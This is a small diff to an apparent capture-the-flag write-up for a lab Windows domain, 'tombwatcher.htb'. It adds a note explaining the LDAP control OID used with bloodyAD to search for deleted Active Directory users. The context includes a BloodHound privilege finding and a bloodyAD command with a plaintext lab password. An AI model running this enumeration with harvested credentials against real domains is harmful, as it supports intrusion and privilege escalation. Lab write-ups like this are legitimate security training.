@@ -492,7 +492,7 @@ And we got the user flag.
 
 We see on Bloodhound that `john` has `GenericAll` on the `ADCS Organizational Unit`.
 
-We'll search for deleted objects with `bloodyad` and `-c 1.2.840.113556.1.4.417`
+We'll search for deleted objects with `bloodyad` and `-c 1.2.840.113556.1.4.417` (which is the OID for `TOMBS` (deleted, not recycled items)
 
 ```bash
 >  /usr/bin/bloodyad --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'john' -p 'Scrow123&' get search --filter '(&(isDeleted=TRUE)(objectClass=user))' --attr 'sAMAccountName,distinguishedName,lastKnownParent'  
